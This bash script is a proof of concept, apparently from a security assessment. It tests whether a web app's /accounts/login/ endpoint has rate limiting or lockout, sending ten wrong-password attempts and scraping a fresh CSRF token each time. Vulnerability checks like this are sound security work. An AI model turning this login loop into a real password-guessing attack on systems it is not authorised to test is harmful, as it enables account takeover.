#!/bin/bash

# POC: Missing Brute Force Protection on Login Endpoint
# Target: /accounts/login/
# Demonstrates that unlimited login attempts are allowed without rate limiting

TARGET_URL="${1:-http://localhost:8000}"
LOGIN_ENDPOINT="${TARGET_URL}/accounts/login/"
COOKIE_JAR="/tmp/poc_cookies_$$.txt"
ATTEMPTS=10

echo "[*] Testing Missing Brute Force Protection"
echo "[*] Target: $LOGIN_ENDPOINT"
echo "[*] Performing $ATTEMPTS consecutive failed login attempts..."
echo ""

# Initialize session
echo "[+] Initializing session..."
curl -s -c "$COOKIE_JAR" "$LOGIN_ENDPOINT" > /dev/null

# Track responses
http_codes=()
rate_limited=0
locked_out=0

# Attempt multiple logins with different passwords
for i in $(seq 1 $ATTEMPTS); do
    # Fetch login page to get fresh CSRF token
    RESPONSE=$(curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" "$LOGIN_ENDPOINT")
    
    # Extract CSRF token
    CSRF_TOKEN=$(echo "$RESPONSE" | grep -oP 'csrfmiddlewaretoken" value="\K[^"]*' | head -1)
    
    if [ -z "$CSRF_TOKEN" ]; then
        echo "[-] Warning: Could not extract CSRF token on attempt $i"
        CSRF_TOKEN="dummy_token"
    fi
    
    # Perform login attempt with wrong password
    HTTP_RESPONSE=$(curl -s -w "\n%{http_code}" -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
        -X POST "$LOGIN_ENDPOINT" \
        -d "username=testuser&password=wrongpassword_$i&csrfmiddlewaretoken=$CSRF_TOKEN" \
        -H "Content-Type: application/x-www-form-urlencoded")
    
    HTTP_CODE=$(echo "$HTTP_RESPONSE" | tail -n1)
    http_codes+=("$HTTP_CODE")
    
    echo "Attempt $i: HTTP $HTTP_CODE"
    
    # Check for rate limiting indicators
    if [ "$HTTP_CODE" = "429" ]; then
        echo "  [!] Rate limiting detected (HTTP 429)"
        ((rate_limited++))
    fi
    
    if [ "$HTTP_CODE" = "503" ]; then
        echo "  [!] Account lockout detected (HTTP 503)"
        ((locked_out++))
    fi
done

echo ""
echo "[*] Summary:"
echo "  Total Attempts: $ATTEMPTS"
echo "  Rate Limited (HTTP 429): $rate_limited"
echo "  Locked Out (HTTP 503): $locked_out"

# Analyze results
echo ""
echo "[*] Vulnerability Assessment:"
all_200=true
for code in "${http_codes[@]}"; do
    if [ "$code" != "200" ] && [ "$code" != "302" ]; then
        all_200=false
        break
    fi
done

if [ "$all_200" = true ] && [ $rate_limited -eq 0 ] && [ $locked_out -eq 0 ]; then
    echo "[+] VULNERABILITY CONFIRMED: No brute force protection detected"
    echo "    - All $ATTEMPTS attempts were accepted without rate limiting"
    echo "    - No HTTP 429 (Too Many Requests) responses"
    echo "    - No HTTP 503 (Service Unavailable) responses"
    echo "    - System is vulnerable to brute force attacks"
    EXIT_CODE=0
else
    echo "[-] Brute force protection may be in place"
    echo "    - Rate limited responses: $rate_limited"
    echo "    - Lockout responses: $locked_out"
    EXIT_CODE=1
fi

# Cleanup
rm -f "$COOKIE_JAR"

exit $EXIT_CODE